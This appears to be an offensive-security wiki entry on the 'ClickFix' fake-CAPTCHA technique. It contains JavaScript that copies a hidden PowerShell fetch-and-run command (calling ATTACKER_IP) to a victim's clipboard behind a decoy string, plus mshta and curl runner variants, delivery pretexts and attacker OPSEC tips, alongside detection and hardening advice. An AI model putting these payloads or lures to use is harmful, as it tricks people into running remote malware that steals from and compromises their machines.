**ClickFix** — a "self-pwn" social-engineering technique: a fake CAPTCHA, browser error, or "document failed to render / verify you are human" prompt instructs the victim to **press Win+R, paste, and Enter**. Malicious JavaScript has silently copied a command to their clipboard, so the paste runs your PowerShell/mshta payload. No attachment, no download for the mail gateway to scan - the victim executes the code themselves. It became one of the top initial-access vectors in 2025-2026.

## How it works

1. Victim lands on a page mimicking Cloudflare Turnstile / Google reCAPTCHA (via malvertising, SEO poisoning, or a phishing link).
2. Clicking "I'm not a robot" triggers JS that writes a command to the clipboard (`navigator.clipboard.writeText(...)`).
3. On-screen "verification steps" tell the victim: **Win+R** (Run dialog) → **Ctrl+V** → **Enter** (some variants use the terminal or the File Explorer address bar).
4. The pasted one-liner runs - usually a hidden PowerShell that fetches a second stage. The visible portion is often padded with spaces / a fake "✅ verification ID" to hide the real command.

Because execution happens in the user's own session with no dropped file, it evades attachment/download inspection and MOTW entirely.

## Setup

Page-side JS copies the runner to the clipboard:

```js

const cmd = "powershell -w hidden -nop -c \"iwr http://ATTACKER_IP/s -useb | iex\"";
// padded so the Run dialog shows an innocuous prefix; real command scrolls off
const decoy = "✅ ​Verification ID: 7F2A-9C  ";
navigator.clipboard.writeText(decoy + cmd);

```

Common runner variants the paste executes:
- `powershell -w hidden -nop -c "iwr .../s -useb|iex"`
- `mshta http://ATTACKER_IP/a.hta`
- `nslookup` / `curl` chained to fetch + run a stage (blends with "network check" pretext).

Builder kits and phishing frameworks now ship ClickFix landing templates; the technique is trivial to hand-roll.

## Delivery

- Malvertising / SEO-poisoned results, compromised sites, or a direct phishing link to the fake-CAPTCHA page.
- Pretext framing: "verify you are human", "fix display of this document", "your browser needs an update".

## Detection & OPSEC

- **Blue team:** hunt `explorer.exe` → `powershell`/`mshta`/`cmd` where the command line came via the **RunMRU** registry key (`HKCU\...\Explorer\RunMRU` records what was typed/pasted into Run); alert on clipboard-sourced script execution; EDR rules for `powershell -w hidden ... iex` from an interactive session.
- **Hardening:** disable/monitor the Run dialog via policy, constrained language mode, and user awareness ("never paste commands you didn't write").
- **Offense:** keep the visible portion benign; the whole value is the victim trusting the "verification" ritual.

## References

- Microsoft - Analyzing the ClickFix social-engineering technique - https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
- Group-IB - ClickFix - https://www.group-ib.com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
- Splunk - Unveiling fake CAPTCHA / ClickFix - https://www.splunk.com/en_us/blog/security/unveiling-fake-captcha-clickfix-attacks.html
